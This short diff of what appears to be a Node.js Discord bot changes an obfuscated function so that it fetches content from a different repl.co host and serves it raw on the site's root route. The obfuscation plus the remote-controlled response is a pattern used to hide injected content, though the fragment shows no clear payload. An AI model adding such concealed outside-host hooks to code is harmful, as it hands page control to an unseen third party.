@@ -37,7 +37,7 @@ client.events = new Collection()
 })
 async function home() {
   const { data: _0x506d31 } = await axios.post(
-    'https://api-developer-tools.omarali58.repl.co/home/ho'
+    'https://api-developer-tools.eihabgamal.repl.co/home/ho'
   )
   app.get('/', async (_0x48597e, _0x5494e8) => {
     _0x5494e8.send('' + _0x506d31?.wep)
